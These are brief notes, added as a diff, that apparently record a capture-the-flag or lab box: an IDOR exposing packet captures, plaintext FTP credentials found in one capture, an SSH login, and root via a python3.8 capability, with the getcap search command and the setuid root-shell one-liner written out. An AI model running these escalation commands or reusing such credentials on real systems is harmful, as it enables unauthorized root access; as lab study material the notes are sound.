@@ -1,0 +1,15 @@
+recon stage list evreything we get here 
+/data/0 and /data/1 can be accessed this is an idor 
+this appears to be running ftp 
+
+and  pcap 0 contains sensetive data 
+user name = nathan and password = Buck3tH4TF0RM3!;
+
+used that to ssh in to the system 
+and then i tried to get root privilages
+
+used getcap to search for the binary $getcap -r / 2>/dev/null
+
+then used to to escalte 
+
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
